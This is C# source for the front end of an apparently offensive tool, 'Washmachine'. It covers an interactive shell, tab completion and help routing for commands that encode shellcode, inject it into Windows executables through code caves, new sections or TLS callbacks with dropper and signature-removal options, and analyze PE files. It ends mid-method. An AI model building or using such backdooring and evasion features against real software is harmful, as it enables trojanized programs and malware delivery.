using System.Globalization;
using System.Text;
using System.Text.Json;
using Spectre.Console;
using Spectre.Console.Rendering;
using Washmachine.Cli.Ui;
using Washmachine.Logging;
using Washmachine.Models;
using Washmachine.Services;
using Washmachine.Testing;

namespace Washmachine.Cli;

public static partial class Program
{
    private static readonly JsonSerializerOptions JsonPrint = new() { WriteIndented = false };
    private static readonly Dictionary<string, List<string>> InputHistory = new(StringComparer.OrdinalIgnoreCase);
    private static readonly string[] RootReplCommands =
    {
        "encode", "analyze", "backdoor", "strip", "show", "provision", "test", "scan", "help",
        "banner", "scheme", "clear", "cls", "exit", "quit", "q"
    };
    private static StartupResult? _startupResult;
    private static readonly string[] SubModeCommands = { "help", "back", "exit", "..", "q" };
    private static readonly string[] ShowTargets = { "all", "encoders", "envelopes", "modules", "templates", "snippets", "compilers", "execution" };
    private static readonly string[] ShowLegacyTargets = { "--templates", "--encoders", "--snippets", "--compilers" };
    private static readonly string[] BackdoorMethodValues = { "code-cave", "new-section", "section-ext", "text-pad", "tls-callback" };
    private static readonly string[] BackdoorEncryptionValues = { "none" };
    private static readonly string[] BackdoorCarrierValues = { "entry-point", "dll-main" };
    private static readonly string[] BackdoorModeValues = { "normal", "silence", "dropper" };
    private static readonly string[] StripModeValues = { "ep", "entry-point", "section" };
    private static readonly Dictionary<string, string[]> CommandOptionCompletions = new(StringComparer.OrdinalIgnoreCase)
    {
        ["encode"] = new[]
        {
            "-Shellcode", "--shellcode", "-s", "-ShellcodeHex", "--shellcode-hex",
            "-ShellcodeUrl", "--shellcode-url", "-u", "-Template", "--template", "-t",
            "-Encoder", "--encoder", "-e", "-Envelope", "--envelope", "-v",
            "-Sgn", "--sgn", "--shikata-ga-nai", "-SgnCount", "--shikata-enc",
            "-SgnMax", "--shikata-max", "-SgnPlacement", "--sgn-placement",
            "-CloneFrom", "--clone-from", "-CloneResources", "--clone-resources",
            "-NoCloneResources", "--no-clone-resources", "-CloneIcon", "--clone-icon",
            "-NoCloneIcon", "--no-clone-icon", "-CloneMetadata", "--clone-metadata",
            "-NoCloneMetadata", "--no-clone-metadata", "-PadNops", "--pad-nops",
            "-Snippet", "--snippet", "-Text", "--text", "-Verbose", "--verbose",
            "-Json", "--json"
        },
        ["analyze"] = new[] { "-Pe", "--pe", "-Json", "--json" },
        ["backdoor"] = new[]
        {
            "-Pe", "--pe", "-Shellcode", "--shellcode", "-s", "-Output", "--output", "-o",
            "-Method", "--method", "-m", "-Encryption", "--encryption", "--enc",
            "-XorKey", "--xor-key", "-SectionName", "--section-name",
            "-NoRemoveSig", "--no-remove-sig", "-NoPatchSubsystem", "--no-patch-subsystem",
            "-Carrier", "--carrier", "--invoke", "-NoPreserveEntry", "--no-preserve-entry",
            "-NoPatchIat", "--no-patch-iat", "-NoPatchExit", "--no-patch-exit",
            "-CaveMinSize", "--cave-min-size", "-DryRun", "--dry-run",
            "-SessionLog", "--session-log", "-NoSessionLog", "--no-session-log",
            "-Verbose", "--verbose", "-Json", "--json",
            "-Mode", "--mode", "-Implant", "--implant"
        },
        ["strip"] = new[]
        {
            "-Pe", "--pe", "-Output", "--output", "-o", "-Mode", "--mode", "-m",
            "-Section", "--section", "-Analyze", "--analyze",
            "-NoTrim", "--no-trim"
        },
        ["show"] = ShowTargets,
        ["provision"] = new[] { "-CoreOnly", "--core-only" },
        ["test"] = new[] { "--help", "-h" },
        ["scan"] = new[] { "-Json", "--json", "--help", "-h" },
        ["help"] = new[] { "encode", "analyze", "backdoor", "strip", "show", "provision", "test", "scan" }
    };
    private static bool _isRepl;

    public static async Task<int> Main(string[] args)
    {
        Console.OutputEncoding = System.Text.Encoding.UTF8;
        Console.InputEncoding = System.Text.Encoding.UTF8;

        ApplySchemeFromEnvironment();

        // One-shot mode: command provided on command line (e.g., from GUI or scripts)
        if (args.Length > 0)
        {
            return await DispatchAsync(args);
        }

        // Interactive REPL mode — Metasploit-style shell.
        // Auto-run requirements + compiler checks first, then clear and show banner.
        var paths = new AppPaths();
        var logger = new ConsoleLogger();
        _startupResult = await StartupChecks.RunAsync(paths, logger);

        ShowBanner();
        return await RunReplAsync();
    }

    private static void ApplySchemeFromEnvironment()
    {
        // NO_COLOR (https://no-color.org) — strip all ANSI styling so plain-text
        // consumers (CI, log files, accessibility tools) receive clean output.
        if (!string.IsNullOrWhiteSpace(Environment.GetEnvironmentVariable("NO_COLOR")))
        {
            AnsiConsole.Profile.Capabilities.ColorSystem = ColorSystem.NoColors;
            AnsiConsole.Profile.Capabilities.Ansi = false;
            return;   // do not apply a color scheme on top of a no-color profile
        }

        var env = Environment.GetEnvironmentVariable("WASHMACHINE_SCHEME");
        if (!string.IsNullOrWhiteSpace(env))
        {
            UiColors.TrySetScheme(env);
        }
    }

    /// <summary>Dispatch a single command (one-shot or from REPL).</summary>
    private static async Task<int> DispatchAsync(string[] args)
    {
        bool jsonMode = args.Any(a => a == "--json");

        // Top-level help / version requests, before command dispatch.
        if (IsHelpToken(args[0])) return HandleHelp(args.Skip(1).ToArray());
        if (IsVersionToken(args[0])) { Console.WriteLine(Ui.Banner.AppVersion); return 0; }

        var command = args[0].ToLowerInvariant();
        var cmdArgs = args.Skip(1).ToArray();

        // Help requested as the first argument to a command (e.g. encode --help).
        bool wantsHelp = ArgsStartWithHelp(cmdArgs);

        return command switch
        {
            "encode"    => wantsHelp ? PrintEncodeUsage() : await RunEncodeAsync(cmdArgs),
            "analyze"   => wantsHelp ? PrintAnalyzeUsage() : await RunAnalyzeAsync(cmdArgs),
            "backdoor"  => wantsHelp ? PrintBackdoorUsage() : await RunBackdoorAsync(cmdArgs),
            "strip"     => wantsHelp ? PrintStripUsage() : await RunStripAsync(cmdArgs),
            "show"      => wantsHelp ? PrintShowUsage() : await RunShowAsync(cmdArgs),
            "list"      => wantsHelp ? PrintShowUsage() : await RunShowAsync(cmdArgs),
            "provision" => wantsHelp ? PrintProvisionUsage() : await RunProvisionAsync(cmdArgs),
            "test"      => wantsHelp ? PrintTestUsage() : await TestHarness.RunAsync(cmdArgs),
            "scan"      => wantsHelp ? PrintScanUsage() : RunScan(cmdArgs),
            _ => PrintUnknownCommand(command),
        };
    }

    /// <summary>Route help to per-command help when a subcommand is specified.</summary>
    private static int HandleHelp(string[] args)
    {
        if (args.Length == 0) return PrintUsage();
        var topic = args[0].ToLowerInvariant();
        return topic switch
        {
            "encode"    => PrintEncodeUsage(),
            "analyze"   => PrintAnalyzeUsage(),
            "backdoor"  => PrintBackdoorUsage(),
            "strip"     => PrintStripUsage(),
            "show" or "list" => PrintShowUsage(),
            "provision" => PrintProvisionUsage(),
            "test"      => PrintTestUsage(),
            "scan"      => PrintScanUsage(),
            _ => HandleHelpUnknown(args[0]),
        };
    }

    private static int HandleHelpUnknown(string topic)
    {
        var validTopics = new[] { "encode", "analyze", "backdoor", "strip", "show", "list", "provision", "test", "scan" };
        var suggestions = SuggestSimilarNames(topic, validTopics, 3);

        AnsiConsole.WriteLine();
        AnsiConsole.MarkupLine($"[{UiColors.Error}]Unknown help topic '{Markup.Escape(topic)}'.[/]");
        if (suggestions.Count > 0)
        {
            AnsiConsole.MarkupLine($"[{UiColors.Muted}]Did you mean:[/] " +
                string.Join(", ", suggestions.Select(s => $"[{UiColors.Accent}]{Markup.Escape(s)}[/]")));
        }
        AnsiConsole.MarkupLine($"[{UiColors.Muted}]Run[/] [{UiColors.Accent}]help[/] [{UiColors.Muted}]on its own to see all commands.[/]");
        AnsiConsole.WriteLine();
        return PrintUsage();
    }

    /// <summary>Interactive read-eval-print loop.</summary>
    private static async Task<int> RunReplAsync()
    {
        _isRepl = true;
        while (true)
        {
            AnsiConsole.WriteLine();
            string? input;
            try
            {
                input = ReadLineWithEditor($"[{UiColors.Header}]washmachine[/] [{UiColors.Accent}]❯[/] ", "root");
            }
            catch (InvalidOperationException)
            {
                // Non-interactive terminal (piped input exhausted)
                break;
            }

            if (input is null)
                break;

            var line = input.Trim();
            if (string.IsNullOrEmpty(line))
                continue;

            switch (line.ToLowerInvariant())
            {
                case "exit" or "quit" or "q":
                    AnsiConsole.MarkupLine("[dim]Goodbye.[/]");
                    return 0;
                case "clear" or "cls":
                    try { AnsiConsole.Clear(); } catch { /* non-interactive */ }
                    continue;
                case "banner":
                    ShowBanner();
                    continue;
                case "version" or "--version" or "-v":
                    AnsiConsole.MarkupLine($"[{UiColors.Accent}]washmachine-cli[/] [{UiColors.Value}]v{Ui.Banner.AppVersion}[/]");
                    continue;
            }

            if (IsHelpToken(line))
            {
                PrintUsage();
                continue;
            }

            // `scheme` command — before generic dispatch so it also runs without tokens.
            if (line.StartsWith("scheme", StringComparison.OrdinalIgnoreCase))
            {
                var tok = TokenizeLine(line);
                RunSchemeCommand(tok.Skip(1).ToArray());
                continue;
            }

            // Tokenize input (respecting quoted strings)
            var tokens = TokenizeLine(line);
            if (tokens.Length == 0) continue;

            try
            {
                await DispatchAsync(tokens);
            }
            catch (Exception ex)
            {
                WriteStatus(StatusPrefix.Failure, ex.Message);
            }
        }

        return 0;
    }

    /// <summary>Split a command line into tokens, respecting double-quoted strings.</summary>
    private static string[] TokenizeLine(string line)
    {
        var tokens = new List<string>();
        var current = new StringBuilder();
        bool inQuote = false;

        foreach (char c in line)
        {
            if (c == '"')
            {
                inQuote = !inQuote;
            }
            else if (c == ' ' && !inQuote)
            {
                if (current.Length > 0)
                {
                    tokens.Add(current.ToString());
                    current.Clear();
                }
            }
            else
            {
                current.Append(c);
            }
        }

        if (current.Length > 0)
            tokens.Add(current.ToString());

        return tokens.ToArray();
    }

    /// <summary>Enter a sub-mode REPL for a given command when invoked with no args in REPL mode.</summary>
    private static async Task<int> RunSubMode(string modeName, Func<string[], Task<int>> handler, Func<int>? helpFunc = null)
    {
        if (!_isRepl)
        {
            helpFunc?.Invoke();
            return 1;
        }

        while (true)
        {
            AnsiConsole.WriteLine();
            string? input;
            try
            {
                input = ReadLineWithEditor(
                    $"[{UiColors.Header}]washmachine[/] [{UiColors.Accent}]{Markup.Escape(modeName)}[/] [{UiColors.Accent}]>[/] ",
                    modeName,
                    modeName);
            }
            catch (InvalidOperationException) { break; }

            if (input is null) break;

            var cmd = input.Trim();
            if (string.IsNullOrEmpty(cmd)) continue;
            if (cmd.ToLowerInvariant() is "back" or "exit" or ".." or "q") break;
            if (cmd.ToLowerInvariant() is "clear" or "cls") { try { AnsiConsole.Clear(); } catch { /* non-interactive */ } continue; }
            if (IsHelpToken(cmd)) { helpFunc?.Invoke(); continue; }

            var tokens = TokenizeLine(cmd);
            if (tokens.Length == 0) continue;

            try { await handler(tokens); }
            catch (Exception ex) { WriteStatus(StatusPrefix.Failure, ex.Message); }
        }
        return 0;
    }

    private static string? ReadLineWithEditor(string promptMarkup, string historyScope, string? fixedCommand = null)
    {
        if (Console.IsInputRedirected || Console.IsOutputRedirected)
            return Console.ReadLine();

        AnsiConsole.Markup(promptMarkup);

        int originLeft = Console.CursorLeft;
        int originTop = Console.CursorTop;
        int previousRenderLines = 1;
        int cursorIndex = 0;
        var buffer = new StringBuilder();
        var history = GetHistoryBucket(historyScope);
        int historyIndex = history.Count;
        string draft = string.Empty;

        void ReplaceBuffer(string value)
        {
            buffer.Clear();
            buffer.Append(value);
            cursorIndex = buffer.Length;
        }

        void Render()
        {
            try
            {
                int width = Math.Max(Console.BufferWidth, 1);
                int bufferHeight = Math.Max(Console.BufferHeight, 1);

                // Clamp origin if console was resized (zoom in/out)
                originTop = Math.Clamp(originTop, 0, bufferHeight - 1);
                originLeft = Math.Clamp(originLeft, 0, width - 1);

                int currentRenderLines = GetWrappedLineCount(originLeft, buffer.Length, width);
                int linesToClear = Math.Max(previousRenderLines, currentRenderLines);

                for (int i = 0; i < linesToClear; i++)
                {
                    int row = originTop + i;
                    if (row >= bufferHeight) break;
                    int left = i == 0 ? originLeft : 0;
                    Console.SetCursorPosition(left, row);
                    Console.Write(new string(' ', Math.Max(1, width - left)));
                }

                Console.SetCursorPosition(originLeft, originTop);
                Console.Write(buffer.ToString());

                previousRenderLines = currentRenderLines;

                int absoluteIndex = originLeft + cursorIndex;
                int cursorTop = Math.Min(originTop + (absoluteIndex / width), bufferHeight - 1);
                int cursorLeft = Math.Clamp(absoluteIndex % width, 0, width - 1);
                Console.SetCursorPosition(cursorLeft, cursorTop);
            }
            catch (ArgumentOutOfRangeException)
            {
                // Console was resized mid-render; safe to ignore
            }
        }

        void ShowCompletionChoices(IReadOnlyList<string> matches)
        {
            AnsiConsole.WriteLine();
            foreach (var chunk in matches.Chunk(6))
                AnsiConsole.MarkupLine($"[dim]  {string.Join("  ", chunk.Select(Markup.Escape))}[/]");

            AnsiConsole.Markup(promptMarkup);
            originLeft = Console.CursorLeft;
            originTop = Console.CursorTop;
            previousRenderLines = 1;
            Render();
        }

        while (true)
        {
            ConsoleKeyInfo key;
            try
            {
                key = Console.ReadKey(intercept: true);
            }
            catch (InvalidOperationException)
            {
                Console.WriteLine();
                return buffer.ToString();
            }

            switch (key.Key)
            {
                case ConsoleKey.Enter:
                {
                    Console.WriteLine();
                    var line = buffer.ToString();
                    AddHistoryEntry(historyScope, line);
                    return line;
                }
                case ConsoleKey.LeftArrow:
                    if (cursorIndex > 0)
                    {
                        cursorIndex--;
                        Render();
                    }
                    break;
                case ConsoleKey.RightArrow:
                    if (cursorIndex < buffer.Length)
                    {
                        cursorIndex++;
                        Render();
                    }
                    break;
                case ConsoleKey.Home:
                    if (cursorIndex != 0)
                    {
                        cursorIndex = 0;
                        Render();
                    }
                    break;
                case ConsoleKey.End:
                    if (cursorIndex != buffer.Length)
                    {
                        cursorIndex = buffer.Length;
                        Render();
                    }
                    break;
                case ConsoleKey.Backspace:
                    if (cursorIndex > 0)
                    {
                        buffer.Remove(cursorIndex - 1, 1);
                        cursorIndex--;
                        historyIndex = history.Count;
                        Render();
                    }
                    break;
                case ConsoleKey.Delete:
                    if (cursorIndex < buffer.Length)
                    {
                        buffer.Remove(cursorIndex, 1);
                        historyIndex = history.Count;
                        Render();
                    }
                    break;
                case ConsoleKey.UpArrow:
                    if (history.Count > 0)
                    {
                        if (historyIndex == history.Count)
                            draft = buffer.ToString();

                        if (historyIndex > 0)
                        {
                            historyIndex--;
                            ReplaceBuffer(history[historyIndex]);
                            Render();
                        }
                    }
                    break;
                case ConsoleKey.DownArrow:
                    if (history.Count > 0)
                    {
                        if (historyIndex < history.Count - 1)
                        {
                            historyIndex++;
                            ReplaceBuffer(history[historyIndex]);
                            Render();
                        }
                        else if (historyIndex == history.Count - 1)
                        {
                            historyIndex = history.Count;
                            ReplaceBuffer(draft);
                            Render();
                        }
                    }
                    break;
                case ConsoleKey.Tab:
                {
                    var matches = GetCompletionMatches(fixedCommand, buffer.ToString(), cursorIndex, out int replaceStart, out int replaceEnd, out string currentPrefix);
                    if (matches.Count == 0)
                        break;

                    if (matches.Count == 1)
                    {
                        buffer.Remove(replaceStart, replaceEnd - replaceStart);
                        buffer.Insert(replaceStart, matches[0]);
                        cursorIndex = replaceStart + matches[0].Length;
                        historyIndex = history.Count;
                        Render();
                        break;
                    }

                    var commonPrefix = GetCommonPrefix(matches);
                    if (!string.IsNullOrEmpty(commonPrefix) && commonPrefix.Length > currentPrefix.Length)
                    {
                        buffer.Remove(replaceStart, replaceEnd - replaceStart);
                        buffer.Insert(replaceStart, commonPrefix);
                        cursorIndex = replaceStart + commonPrefix.Length;
                        historyIndex = history.Count;
                        Render();
                        break;
                    }

                    ShowCompletionChoices(matches);
                    break;
                }
                default:
                    if (key.Modifiers.HasFlag(ConsoleModifiers.Control) && key.Key == ConsoleKey.A)
                    {
                        if (cursorIndex != 0)
                        {
                            cursorIndex = 0;
                            Render();
                        }
                    }
                    else if (key.Modifiers.HasFlag(ConsoleModifiers.Control) && key.Key == ConsoleKey.E)
                    {
                        if (cursorIndex != buffer.Length)
                        {
                            cursorIndex = buffer.Length;
                            Render();
                        }
                    }
                    else if (!char.IsControl(key.KeyChar))
                    {
                        buffer.Insert(cursorIndex, key.KeyChar);
                        cursorIndex++;
                        historyIndex = history.Count;
                        Render();
                    }
                    break;
            }
        }
    }

    private static List<string> GetHistoryBucket(string historyScope)
    {
        if (!InputHistory.TryGetValue(historyScope, out var bucket))
        {
            bucket = new List<string>();
            InputHistory[historyScope] = bucket;
        }

        return bucket;
    }

    private static void AddHistoryEntry(string historyScope, string line)
    {
        if (string.IsNullOrWhiteSpace(line))
            return;

        var bucket = GetHistoryBucket(historyScope);
        if (bucket.Count == 0 || !string.Equals(bucket[^1], line, StringComparison.Ordinal))
            bucket.Add(line);

        const int maxHistoryEntries = 200;
        if (bucket.Count > maxHistoryEntries)
            bucket.RemoveAt(0);
    }

    private static IReadOnlyList<string> GetCompletionMatches(string? fixedCommand, string line, int cursorIndex, out int replaceStart, out int replaceEnd, out string currentPrefix)
    {
        GetCurrentWordSpan(line, cursorIndex, out replaceStart, out replaceEnd);

        string beforeCursor = line[..cursorIndex];
        var tokensBeforeCursor = TokenizeLine(beforeCursor);
        bool atTokenBoundary = cursorIndex == 0 || char.IsWhiteSpace(line[cursorIndex - 1]);
        currentPrefix = atTokenBoundary || tokensBeforeCursor.Length == 0 ? string.Empty : tokensBeforeCursor[^1];
        int currentTokenIndex = atTokenBoundary ? tokensBeforeCursor.Length : tokensBeforeCursor.Length - 1;

        IEnumerable<string> matches;
        if (fixedCommand is null)
        {
            if (currentTokenIndex == 0)
            {
                matches = FilterCompletionMatches(RootReplCommands, currentPrefix);
            }
            else
            {
                string command = tokensBeforeCursor[0].ToLowerInvariant();
                matches = GetCommandCompletionMatches(command, tokensBeforeCursor.Skip(1).ToArray(), currentTokenIndex - 1, currentPrefix, includeSubModeCommands: false);
            }
        }
        else
        {
            matches = GetCommandCompletionMatches(fixedCommand, tokensBeforeCursor, currentTokenIndex, currentPrefix, includeSubModeCommands: true);
        }

        return matches.ToArray();
    }

    private static IEnumerable<string> GetCommandCompletionMatches(string command, string[] argTokens, int currentArgIndex, string currentPrefix, bool includeSubModeCommands)
    {
        if (command.Equals(EncodeSessionCompletionCommand, StringComparison.OrdinalIgnoreCase))
            return GetEncodeSessionCompletionMatches(argTokens, currentArgIndex, currentPrefix);
        if (command.Equals(StripSessionCompletionCommand, StringComparison.OrdinalIgnoreCase))
            return GetStripSessionCompletionMatches(argTokens, currentArgIndex, currentPrefix);
        if (command.Equals(BackdoorSessionCompletionCommand, StringComparison.OrdinalIgnoreCase))
            return GetBackdoorSessionCompletionMatches(argTokens, currentArgIndex, currentPrefix);

        if (command.Equals("help", StringComparison.OrdinalIgnoreCase))
            return currentArgIndex == 0 ? FilterCompletionMatches(CommandOptionCompletions["help"], currentPrefix) : Array.Empty<string>();

        string? previousToken = GetPreviousToken(argTokens, currentArgIndex);
        var valueCandidates = GetOptionValueCandidates(command, previousToken);
        if (valueCandidates.Length > 0)
            return FilterCompletionMatches(valueCandidates, currentPrefix);

        if ((command.Equals("show", StringComparison.OrdinalIgnoreCase) || command.Equals("list", StringComparison.OrdinalIgnoreCase))
            && currentArgIndex == 0)
        {
            var showCandidates = currentPrefix.StartsWith("-", StringComparison.Ordinal)
                ? ShowLegacyTargets
                : ShowTargets.Concat(ShowLegacyTargets).ToArray();
            return FilterCompletionMatches(showCandidates, currentPrefix);
        }

        var candidates = new List<string>();
        if (includeSubModeCommands && currentArgIndex == 0)
            candidates.AddRange(SubModeCommands);

        if (CommandOptionCompletions.TryGetValue(command, out var options))
            candidates.AddRange(options);

        return FilterCompletionMatches(candidates, currentPrefix);
    }

    private static string[] GetOptionValueCandidates(string command, string? previousToken)
    {
        if (string.IsNullOrEmpty(previousToken))
            return Array.Empty<string>();

        return command.ToLowerInvariant() switch
        {
            "backdoor" when previousToken is "-Method" or "--method" or "-m" => BackdoorMethodValues,
            "backdoor" when previousToken is "-Encryption" or "--encryption" or "--enc" => BackdoorEncryptionValues,
            "backdoor" when previousToken is "-Carrier" or "--carrier" or "--invoke" => BackdoorCarrierValues,
            "strip" when previousToken is "-Mode" or "--mode" or "-m" => StripModeValues,
            "show" or "list" when previousToken is "modules" or "module" or "snippets" => GetShowModuleCategoryCandidates(),
            _ => Array.Empty<string>()
        };
    }

    private static IEnumerable<string> FilterCompletionMatches(IEnumerable<string> candidates, string prefix)
    {
        return candidates
            .Where(c => string.IsNullOrEmpty(prefix) || c.StartsWith(prefix, StringComparison.OrdinalIgnoreCase))
            .Distinct(StringComparer.OrdinalIgnoreCase)
            .OrderBy(c => c, StringComparer.OrdinalIgnoreCase);
    }

    private static string? GetPreviousToken(string[] argTokens, int currentArgIndex)
    {
        if (argTokens.Length == 0)
            return null;

        if (currentArgIndex >= argTokens.Length)
            return argTokens[^1];

        return currentArgIndex > 0 ? argTokens[currentArgIndex - 1] : null;
    }

    private static void GetCurrentWordSpan(string line, int cursorIndex, out int start, out int end)
    {
        start = cursorIndex;
        while (start > 0 && !char.IsWhiteSpace(line[start - 1]))
            start--;

        end = cursorIndex;
        while (end < line.Length && !char.IsWhiteSpace(line[end]))
            end++;
    }

    private static int GetWrappedLineCount(int originLeft, int textLength, int consoleWidth)
    {
        if (consoleWidth <= 0)
            return 1;

        if (textLength == 0)
            return 1;

        return ((originLeft + textLength) / consoleWidth) + 1;
    }

    private static string GetCommonPrefix(IReadOnlyList<string> values)
    {
        if (values.Count == 0)
            return string.Empty;

        string prefix = values[0];
        for (int i = 1; i < values.Count; i++)
        {
            int max = Math.Min(prefix.Length, values[i].Length);
            int len = 0;
            while (len < max && char.ToUpperInvariant(prefix[len]) == char.ToUpperInvariant(values[i][len]))
                len++;

            prefix = prefix[..len];
            if (prefix.Length == 0)
                break;
        }

        return prefix;
    }

    // ═══════════════════════════════════════════════════════════════════════
    //  Banner
    // ═══════════════════════════════════════════════════════════════════════

    private static void ShowBanner()
    {
        int? templateCount = null;
        int? sectionCount = null;
        int? snippetCount = null;
        try
        {
            var paths = new AppPaths();
            var snippetService = new YamlCodeSnippetCatalogService(paths);
            var sections = snippetService.GetAllSections();
            sectionCount = sections.Count;
            snippetCount = sections.Sum(s => s.Items.Count);
            templateCount = snippetService.GetTemplates().Count;
        }
        catch { /* catalog not available yet */ }

        string? compilerStatus = null;
        if (_startupResult?.CompilerKind != null)
            compilerStatus = $"compiler: [{UiColors.Success}]{_startupResult.CompilerKind}[/]";
        else if (_startupResult != null)
            compilerStatus = $"compiler: [{UiColors.Error}]missing[/]";

        Banner.Render(templateCount, sectionCount, snippetCount, compilerStatus);
    }

    private static int RunSchemeCommand(string[] args)
    {
        var s = UiColors.ActiveScheme;
        if (args.Length == 0)
        {
            AnsiConsole.WriteLine();
            var table = new Table()
                .Border(TableBorder.Rounded)
                .BorderColor(UiColors.BoxBorderColor)
                .Title($"[bold {s.Header}]Color schemes[/] [{s.Muted}]({ColorSchemes.Names.Count})[/]")
                .AddColumn(new TableColumn($"[{s.Accent}]Key[/]"))
                .AddColumn(new TableColumn($"[{s.Accent}]Name[/]"))
                .AddColumn(new TableColumn($"[{s.Accent}]Author[/]"))
                .AddColumn(new TableColumn($"[{s.Accent}]Swatch[/]"));

            foreach (var name in ColorSchemes.Names)
            {
                var sc = ColorSchemes.All[name];
                bool active = string.Equals(name, UiColors.ActiveScheme.Name, StringComparison.OrdinalIgnoreCase)
                            || ReferenceEquals(sc, UiColors.ActiveScheme);
                string key = active ? $"[bold {s.Success}]▶ {name}[/]" : $"[{s.Value}]{name}[/]";
                string swatch =
                    $"[{sc.BannerPrimary}]██[/]" +
                    $"[{sc.BannerSecondary}]██[/]" +
                    $"[{sc.BannerTertiary}]██[/]" +
                    $"[{sc.Success}]██[/]" +
                    $"[{sc.Warning}]██[/]" +
                    $"[{sc.Error}]██[/]";
                table.AddRow(key, $"[{s.Value}]{Markup.Escape(sc.Name)}[/]", $"[{s.Muted}]{Markup.Escape(sc.Author)}[/]", swatch);
            }
            AnsiConsole.Write(table);
            AnsiConsole.MarkupLine($"  [{s.Muted}]Use[/] [{s.Accent}]scheme <key>[/] [{s.Muted}]to switch.[/]");
            return 0;
        }

        if (!UiColors.TrySetScheme(args[0]))
        {
            AnsiConsole.MarkupLine($"[{s.Error}]Unknown scheme:[/] {Markup.Escape(args[0])}");
            AnsiConsole.MarkupLine($"[{s.Muted}]Known:[/] {string.Join(", ", ColorSchemes.Names)}");
            return 1;
        }

        var now = UiColors.ActiveScheme;
        AnsiConsole.MarkupLine($"[{now.Success}]✓ Scheme set to[/] [{now.Accent}]{Markup.Escape(now.Name)}[/] [{now.Muted}]({Markup.Escape(now.Author)})[/]");
        ShowBanner();
        return 0;
    }

    // ═══════════════════════════════════════════════════════════════════════
    //  encode
    // ═══════════════════════════════════════════════════════════════════════

    private static async Task<int> RunEncodeAsync(string[] args)
    {
        return await HandleEncodeCommandAsync(args);
    }

    // ═══════════════════════════════════════════════════════════════════════
    //  analyze
    // ═══════════════════════════════════════════════════════════════════════

    private static async Task<int> RunAnalyzeAsync(string[] args)
    {
        if (args.Length == 0)
            return await RunSubMode("analyze", RunAnalyzeAsync, PrintAnalyzeUsage);

        if (IsHelpToken(args[0]))
        {
            PrintAnalyzeUsage();
            return 0;
        }

        string? peFile = null;
        bool jsonOutput = false;

        // First arg can be positional PE file (does not start with '-')
        int startIndex = 0;
        if (!args[0].StartsWith("-", StringComparison.Ordinal))
        {
            peFile = args[0];
            startIndex = 1;
        }

        for (int i = startIndex; i < args.Length; i++)
        {
            switch (args[i])
            {
                case "-Pe" or "--pe" when i + 1 < args.Length:
                    peFile = args[++i];
                    break;
                case "-Json" or "--json":
                    jsonOutput = true;
                    break;
            }
        }

        if (peFile is null)
        {
            WriteStatus(StatusPrefix.Failure, "No PE file specified. Pass a path positionally or use '-Pe <file>'. Example: analyze .\\target.exe");
            return 1;
        }

        if (!File.Exists(peFile))
        {
            WriteStatus(StatusPrefix.Failure, $"PE file not found: '{peFile}'. Check the path or run 'analyze --help' for usage.");
            return 1;
        }
        var logger = new ConsoleLogger();
        var analyzer = new PeAnalyzerService(logger);

        try
        {
            var result = await analyzer.AnalyzeAsync(peFile);

            if (jsonOutput)
            {
                Console.WriteLine(JsonSerializer.Serialize(result, JsonPrint));
                return 0;
            }

            // ══════════════════════════════════════════════════════════
            //  DASHBOARD HEADER
            // ══════════════════════════════════════════════════════════
            string peTypeStr = result.IsDriver ? "Driver" : result.IsDll ? "DLL" : "EXE";
            string archShort = result.Is64Bit ? "x64" : "x86";

            var headerMarkup = new Markup(
                $"[bold {UiColors.Header}]\U0001f52c PE ANALYSIS REPORT[/]\n" +
                $"[{UiColors.Muted}]{new string('\u2500', 60)}[/]\n" +
                $"[{UiColors.Accent}]File:[/] [{UiColors.Value}]{Markup.Escape(result.FileName ?? Path.GetFileName(peFile))}[/]     " +
                $"[{UiColors.Accent}]Size:[/] [{UiColors.Value}]{Markup.Escape(result.FileSizeFormatted ?? $"{result.FileSize:N0} bytes")}[/]     " +
                $"[{UiColors.Accent}]Type:[/] [{UiColors.Value}]{peTypeStr} {archShort}[/]");

            AnsiConsole.Write(new Panel(headerMarkup)
                .Border(BoxBorder.Heavy)
                .BorderColor(Color.DarkViolet)
                .Expand());
            AnsiConsole.WriteLine();

            // ══════════════════════════════════════════════════════════
            //  FILE OVERVIEW + SECURITY SIDE-BY-SIDE
            // ══════════════════════════════════════════════════════════
            var overviewLines = new List<string>
            {
                $"[{UiColors.Accent}]File Name:[/]     [{UiColors.Value}]{Markup.Escape(result.FileName ?? "")}[/]",
                $"[{UiColors.Accent}]Size:[/]          [{UiColors.Value}]{Markup.Escape(result.FileSizeFormatted ?? $"{result.FileSize:N0} bytes")}[/]",
                $"[{UiColors.Accent}]SHA-256:[/]       [{UiColors.Muted}]{Markup.Escape(result.FileHash ?? "N/A")}[/]",
                $"[{UiColors.Accent}]Architecture:[/]  [{UiColors.Value}]{Markup.Escape(result.Architecture)}[/]",
                $"[{UiColors.Accent}]Subsystem:[/]     [{UiColors.Value}]{Markup.Escape(result.OptionalHeader?.SubsystemString ?? "N/A")}[/]",
                $"[{UiColors.Accent}]Compiled:[/]      [{UiColors.Value}]{Markup.Escape(result.CompileTimeFormatted ?? "N/A")}[/]",
                $"[{UiColors.Accent}]Linker:[/]        [{UiColors.Value}]{Markup.Escape(result.OptionalHeader?.LinkerVersion ?? "N/A")}[/]",
                $"[{UiColors.Accent}].NET:[/]          {(result.IsDotNet ? $"[{UiColors.Warning}]Yes[/]" : $"[{UiColors.Value}]No[/]")}",
            };

            var overviewPanel = new Panel(new Markup(string.Join("\n", overviewLines)))
                .Header($"[bold {UiColors.Header}]File Overview[/]")
                .Border(BoxBorder.Rounded)
                .BorderColor(UiColors.BoxBorderColor)
                .Expand();

            // Security panel
            var secContent = new List<string>();
            if (result.Security != null)
            {
                var sec = result.Security;
                string scoreColor = sec.SecurityScore < 40 ? "red1" : sec.SecurityScore < 70 ? "gold1" : "green3_1";
                string scoreBar = BuildUsageBar(sec.SecurityScore);
                secContent.Add($"[{UiColors.Accent}]Score:[/] {scoreBar} [{scoreColor}]{sec.SecurityScore}/100[/]");
                if (!string.IsNullOrEmpty(sec.SecurityAssessment))
                    secContent.Add($"[{UiColors.Accent}]Assessment:[/] [{scoreColor}]{Markup.Escape(sec.SecurityAssessment)}[/]");
                secContent.Add("");

                static string FlagL(bool on, string name)
                {
                    string padded = name.PadRight(16);
                    return on ? $"[green3_1]\u2713[/] {padded}" : $"[red1]\u2717[/] [grey63]{padded}[/]";
                }
                static string FlagR(bool on, string name)
                {
                    return on ? $"[green3_1]\u2713[/] {name}" : $"[red1]\u2717[/] [grey63]{name}[/]";
                }

                secContent.Add($"{FlagL(sec.HasAslr, "ASLR")}{FlagR(sec.HasDep, "DEP/NX")}");
